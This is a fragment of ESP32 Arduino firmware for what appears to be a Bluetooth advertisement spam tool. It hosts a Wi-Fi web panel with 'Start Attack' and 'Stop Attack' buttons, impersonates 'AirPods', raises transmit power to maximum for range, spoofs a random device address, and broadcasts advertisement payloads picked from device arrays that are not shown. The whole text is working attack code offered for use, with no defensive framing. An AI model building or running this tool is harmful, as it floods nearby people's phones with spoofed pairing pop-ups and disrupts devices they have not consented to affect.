void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{font-family:Arial,sans-serif; text-align:center; background-color:#121212; color:#ffffff; padding-top:50px;}";
  html += ".btn{padding:20px 40px; font-size:24px; font-weight:bold; color:white; border:none; border-radius:10px; cursor:pointer; width:80%; max-width:300px;}";
  html += ".start{background-color:#28a745; box-shadow: 0 4px 15px rgba(40,167,69,0.5);}";
  html += ".start:hover{background-color:#218838;}";
  html += ".stop{background-color:#dc3545; box-shadow: 0 4px 15px rgba(220,53,69,0.5);}";
  html += ".stop:hover{background-color:#c82333;}</style></head><body>";
  
  html += "<h2>BLE Control Panel</h2>";
  
  if (attack_state == 1) {
    html += "<p style='font-size:20px;'>Status: <b style='color:#28a745;'>ACTIVE (Broadcasting)</b></p><br>";
    html += "<a href='/stop'><button class='btn stop'>Stop Attack</button></a>";
  } else {
    html += "<p style='font-size:20px;'>Status: <b style='color:#dc3545;'>STANDBY</b></p><br>";
    html += "<a href='/start'><button class='btn start'>Start Attack</button></a>";
  }
  
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleStart() {
  attack_state = 1;
  server.sendHeader("Location", "/");
  server.send(303);
}

void handleStop() {
  attack_state = 0;
  if (pAdvertising) {
    pAdvertising->stop();
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

void setup() {
  Serial.begin(115200);

  randomSeed(esp_random());

  Serial.println("\nStarting AP...");
  WiFi.softAP(ssid, password);
  
  Serial.println("AP Started!");
  Serial.print("Control Panel IP: ");
  Serial.println(WiFi.softAPIP()); 

  server.on("/", handleRoot);
  server.on("/start", handleStart);
  server.on("/stop", handleStop);
  server.begin();
  Serial.println("Web Server Started.");

  strip.begin();
  strip.setBrightness(1); 
  strip.clear();
  strip.show(); 

  NimBLEDevice::init("AirPods");
  
  // Maximize TX Power (+9 dBm) for extended operational range
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  
  NimBLEServer *pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  uint8_t null_addr[6] = {0x69, 0xEE, 0xFF, 0xC0, 0xED, 0xFE};
  null_addr[5] |= 0xC0; 
  ble_hs_id_set_rnd(null_addr);
}

NimBLEAdvertisementData getAdvertismentData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();

  if (device_choice == 0) {
    oAdvertisementData.addData(DEVICES[device_index], 31);
  }
  else if (device_choice == 1) {
    oAdvertisementData.addData(SHORT_DEVICES[device_index], 23);
  }
  else if (device_choice == 2) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      oAdvertisementData.addData(DEVICES[random(17)], 31);
    }
    else {
      oAdvertisementData.addData(SHORT_DEVICES[random(13)], 23);
    }
  }
  else if (device_choice == 3) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      oAdvertisementData.addData(SHORT_DEVICES[2], 23);
    }
    else {
      oAdvertisementData.addData(SHORT_DEVICES[8], 23);
    }
  }

  return oAdvertisementData;
}

